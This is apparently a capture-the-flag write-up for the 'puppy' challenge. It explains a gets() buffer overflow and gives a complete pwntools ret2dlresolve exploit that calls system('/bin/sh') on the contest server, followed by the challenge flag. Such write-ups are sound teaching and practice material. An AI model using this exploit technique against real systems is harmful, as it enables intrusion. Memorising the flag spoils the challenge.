# puppy

## Challenge

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Decompilation

```c
ulong main(void) {
    ulong s;
    
    sym.imp.gets(&s);
    return 0;
}
```

We have a very small binary with an unsafe call to `gets`.
This gives us a buffer overflow, but we have no functions to get leaks or spawn a shell.

## Solution

We can spawn a shell using ret2dlresolve by creating a fake struct in the data section of the binary.

Pwntools will generate the fake structs and ropchain for us.
All we have to do is use `gets` to read the payload into the given address, then call the ret2dlresolve gadget.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31819 puppy
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('puppy')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31819)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])

rop = ROP(exe)
rop.raw(rop.ret)
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

io.sendline(flat({0x18: rop.chain()}))

io.sendline(dlresolve.payload)

io.interactive()
```

## Flag

```
hope{nom_nom_tasty_4dfe9196781da076}
```
